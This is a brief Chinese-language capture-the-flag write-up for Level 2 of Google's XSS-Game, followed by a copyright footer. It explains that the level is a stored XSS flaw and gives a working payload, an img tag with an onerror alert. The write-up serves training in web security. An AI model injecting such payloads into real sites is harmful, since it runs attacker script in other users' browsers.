## [[XSS-Game](https://xss-game.appspot.com/)] [[Level 2 - Persistence is key](https://xss-game.appspot.com/level2)] [[解题报告](https://exp-blog.com/safe/ctf/xss-game/level-2-persistence-is-key/)]

------

水题，明显是存储型 XSS 。

提交 `<img src=0 />`发现页面直接解析了

直接构造 payload 即可：

`<img src=0 onerror=alert("exp") />`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-2/imgs/01.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
